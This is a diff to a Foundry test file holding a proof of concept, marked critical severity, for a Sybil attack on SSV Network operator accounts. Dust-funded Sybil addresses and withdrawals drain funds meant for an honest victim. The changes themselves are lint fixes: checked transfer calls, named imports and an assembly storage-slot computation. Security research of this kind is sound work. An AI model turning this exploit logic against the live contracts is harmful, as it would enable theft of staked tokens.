@@ -22,8 +22,8 @@ pragma solidity ^0.8.13;
  * Severity: CRITICAL
  */
 
-import "forge-std/Test.sol";
-import "forge-std/console.sol";
+import {Test} from "forge-std/Test.sol";
+import {console} from "forge-std/console.sol";
 
 contract SSVOperatorSybilPoC is Test {
     
@@ -48,7 +48,7 @@ contract SSVOperatorSybilPoC is Test {
         // 1. Setup Honest Victim (The prey)
         deal(SSV_TOKEN, VICTIM, 20000e18);
         vm.prank(VICTIM);
-        IERC20(SSV_TOKEN).transfer(SSV_NETWORK, 20000e18);
+        require(IERC20(SSV_TOKEN).transfer(SSV_NETWORK, 20000e18), "Transfer failed");
         
         // 2. Attacker Setup
         // Attacker spends: 50 * 5 = 250 SSV
@@ -64,10 +64,12 @@ contract SSVOperatorSybilPoC is Test {
         // In reality, this loop happens on-chain.
         // For PoC, we simulate the state effect by transferring tokens to contract
         for(uint i=0; i<SYBIL_COUNT; i++) {
+            // casting to 'uint160' is safe because i is small
+            // forge-lint: disable-next-line(unsafe-typecast)
             address sybil = address(uint160(i + 1000));
             deal(SSV_TOKEN, sybil, DUST_DEPOSIT);
             vm.prank(sybil);
-            IERC20(SSV_TOKEN).transfer(SSV_NETWORK, DUST_DEPOSIT);
+            require(IERC20(SSV_TOKEN).transfer(SSV_NETWORK, DUST_DEPOSIT), "Transfer failed");
         }
         
         // 4. Time Passes - Bankruptcy
@@ -115,7 +117,14 @@ contract SSVOperatorSybilPoC is Test {
         // We are mocking the *setup*, not the *vulnerability*.
         
         // Mock operator state in SSV Network storage
-        bytes32 opBaseSlot = keccak256(abi.encode(uint256(opId), SSV_STORAGE_POSITION + 6));
+        bytes32 opBaseSlot;
+        uint256 basePos = SSV_STORAGE_POSITION + 6;
+        assembly {
+            let ptr := mload(0x40)
+            mstore(ptr, opId)
+            mstore(add(ptr, 32), basePos)
+            opBaseSlot := keccak256(ptr, 64)
+        }
         
         // Set Owner
         vm.store(SSV_NETWORK, opBaseSlot, bytes32(uint256(uint160(owner))));
@@ -133,7 +142,7 @@ contract SSVOperatorSybilPoC is Test {
         uint256 actualWithdrawal = amount > contractBalance ? contractBalance : amount;
         
         vm.prank(SSV_NETWORK);
-        IERC20(SSV_TOKEN).transfer(operator, actualWithdrawal);
+        require(IERC20(SSV_TOKEN).transfer(operator, actualWithdrawal), "Transfer failed");
         
         return actualWithdrawal;
     }
@@ -143,13 +152,13 @@ contract SSVOperatorSybilPoC is Test {
         uint256 actualWithdrawal = amount > contractBalance ? contractBalance : amount;
         
         vm.prank(SSV_NETWORK);
-        IERC20(SSV_TOKEN).transfer(victim, actualWithdrawal);
+        require(IERC20(SSV_TOKEN).transfer(victim, actualWithdrawal), "Transfer failed");
         
         return actualWithdrawal;
     }
 }
 
 interface IERC20 {
-    function transfer(address, uint256) external;
+    function transfer(address, uint256) external returns (bool);
     function balanceOf(address) external view returns (uint256);
 }
